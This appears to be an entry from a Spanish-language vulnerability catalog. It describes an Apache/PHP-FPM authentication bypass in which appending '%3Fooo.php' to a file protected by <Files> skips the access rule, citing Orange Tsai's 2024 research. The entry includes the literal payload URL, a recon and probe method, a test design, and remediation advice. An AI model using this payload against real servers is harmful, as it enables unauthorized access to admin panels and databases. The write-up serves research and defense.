---
clase: idor
tech: apache-php-fpm
cwe: CWE-288
cvss: 9.1 # [derivado] bypass de autenticacion sobre ficheros protegidos; corregido en Apache 2.4.60
payload: |
  # EL PAYLOAD. LITERAL de la fuente. Un solo '%3F' al final:
  http://server/admin.php%3Fooo.php
  #
  # Configuracion PROTEGIDA que se esquiva - LITERAL de la fuente:
  <Files "admin.php">
      AuthType Basic
      AuthName "Admin Panel"
      AuthUserFile "/etc/apache2/.htpasswd"
      Require valid-user
  </Files>
  #
  # Configuracion de PHP-FPM que lo habilita - LITERAL de la fuente
  # (/etc/apache2/mods-enabled/php8.2-fpm.conf):
  # Using (?:pattern) instead of (pattern) is a small optimization that
  # avoid capturing the matching pattern (as $1) which isn't used here
  <FilesMatch ".+\.ph(?:ar|p|tml)$">
      SetHandler "proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"
  </FilesMatch>
  #
  # Destino reescrito, LITERAL de la fuente:
  #   proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php
  #
  # Mecanica: la directiva <Files> compara el NOMBRE DE FICHERO. Con '%3Fooo.php'
  # añadido, el nombre que ve el chequeo de acceso ya no es 'admin.php', asi que la
  # regla no aplica. Pero PHP-FPM recibe la ruta truncada en el '?' y ejecuta
  # admin.php de todos modos.
  #
  # OTRAS REGLAS <Files> que la fuente dice que se esquivan IGUAL - LITERALES:
  <Files php-info.php>
      # LOCAL ACCESS ONLY
      # Require local
      # LOCAL AND LAN ACCESS
      Require ip 10 172 192.168
  </Files>
  <Files adminer.php>
      Order Allow,Deny
      Deny from all
  </Files>
  <Files xmlrpc.php>
      Order Allow,Deny
      Deny from all
  </Files>
  <Files "cron.php">
      Deny from all
  </Files>
precondicion: "Apache con PHP-FPM via 'SetHandler proxy:...fcgi', y control de acceso aplicado con la directiva <Files> (o <FilesMatch>) sobre un fichero PHP concreto. Cita LITERAL del alcance que da la fuente: 'all authentications or access controls based on the Files directive for a single PHP file are at risk when running together with PHP-FPM!'"
como_se_descubre: |
  Señal en recon: un fichero PHP que devuelve 401/403 (panel de administracion,
  phpinfo, adminer, xmlrpc, cron) en un servidor Apache con PHP-FPM.
  La sonda cuesta UNA peticion: añadir '%3Fooo.php' a la ruta protegida.
  Los cuatro bloques <Files> que la fuente lista no son hipoteticos: son las
  configuraciones que aparecen en guias de endurecimiento y en paquetes de
  distribuciones. Es decir, la poblacion afectada no son despliegues mal hechos sino
  despliegues que siguieron el consejo habitual de proteger ficheros por nombre.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: GET /admin.php%3Fooo.php -> contenido de admin.php, sin autenticacion
  # B: GET /admin.php           -> 401 Unauthorized (el control FUNCIONA)
  # C: GET /ficheroinexistente.php%3Fooo.php -> 404, no un 200 generico
  # El par A/B es el informe entero y es incontestable: la misma pagina, con y sin
  # autenticacion, segun tres caracteres. El control C descarta que el servidor sirva
  # cualquier cosa con ese sufijo.
mata: |
  - Apache 2.4.60 o posterior (la fuente indica que el lote se corrigio ahi).
  - El control de acceso se aplica por <Location> o <Directory> en lugar de <Files>.
  - PHP no se sirve via PHP-FPM con SetHandler proxy.
  - La autorizacion se comprueba DENTRO de la aplicacion PHP y no solo en Apache.
  - C devuelve 200 -> el servidor sirve algo generico y A no prueba bypass.
fuente: "https://blog.orange.tw/posts/2024-08-confusion-attacks-en/ (Orange Tsai, 2024-08-09). Presentado en Black Hat USA 2024, HITCON y OrangeCon. Votada tecnica nº1 de 2024 en el Top 10 de PortSwigger. Payload y configuraciones literales. La fuente NO asigna CVE a esta primitiva concreta en el cuerpo; indica que el lote de 9 vulnerabilidades 'addressed by the Apache HTTP Server in the 2.4.60 update published on 2024-07-01'. CVE-2024-38474 (comillas de interrogacion codificadas en backreferences) encaja por descripcion, pero la fuente NO lo mapea explicitamente."
confianza: alta
fecha: 2026-11-02
---
# [IDOR] Bypass de ACL en Apache con `%3F` — tres caracteres anulan `<Files>` + PHP-FPM

## Principio
La directiva `<Files>` aplica control de acceso comparando el **nombre de fichero**. Con
`%3Fooo.php` añadido a la ruta, el nombre que ve la comprobación ya no es `admin.php`, así
que la regla no se aplica. Pero PHP-FPM recibe la ruta y la trunca en el `?`, ejecutando
`admin.php` igualmente.

Dos componentes leen la misma petición con reglas distintas: el de autorización ve un
nombre, el de ejecución ve otro. Es el principio 19 de `docs/ELITE-MINDSET.md` en su forma
más barata de explotar.

## Payload
```
http://server/admin.php%3Fooo.php
```

La configuración que se esquiva:

```apache
<Files "admin.php">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile "/etc/apache2/.htpasswd"
    Require valid-user
</Files>
```

Y la que lo habilita, que viene por defecto en el paquete de PHP-FPM:

```apache
<FilesMatch ".+\.ph(?:ar|p|tml)$">
    SetHandler "proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"
</FilesMatch>
```

Destino reescrito, literal de la fuente:
`proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php`

## El alcance es lo que hace a esto grave
Cita literal: *"all authentications or access controls based on the `Files` directive for a
single PHP file are at risk when running together with PHP-FPM!"*

Y la fuente lista cuatro bloques `<Files>` concretos que caen igual:

```apache
<Files php-info.php>
    Require ip 10 172 192.168
</Files>
<Files adminer.php>
    Order Allow,Deny
    Deny from all
</Files>
<Files xmlrpc.php>
    Order Allow,Deny
    Deny from all
</Files>
<Files "cron.php">
    Deny from all
</Files>
```

Ninguno es hipotético: son las configuraciones que aparecen en guías de endurecimiento y
en paquetes de distribuciones. La población afectada no son despliegues descuidados, sino
despliegues que **siguieron el consejo habitual** de proteger ficheros por nombre.

## El informe son dos peticiones
`GET /admin.php` → 401. `GET /admin.php%3Fooo.php` → la página. La misma URL, con y sin
autenticación, según tres caracteres. No hay nada que explicar ni ninguna anomalía que
interpretar.

## Impacto
Acceso sin autenticación a paneles administrativos, `phpinfo`, Adminer (interfaz de base
de datos) y `xmlrpc.php`. Cada uno con su propio techo, y Adminer con acceso directo a la
base de datos.

## Remediación
De la fuente: el lote se corrigió en **Apache 2.4.60** (2024-07-01), con la advertencia de
que los arreglos son **incompatibles hacia atrás**: *"If administrators update without
careful consideration, they might disrupt existing configurations, causing service
downtime."*

`# [derivado]`: aplicar el control de acceso por `<Location>` o `<Directory>` en lugar de
`<Files>`, y —la defensa que no depende de Apache— comprobar la autorización **dentro de
la aplicación PHP**, donde se conoce la identidad del usuario y no solo el nombre del
fichero.
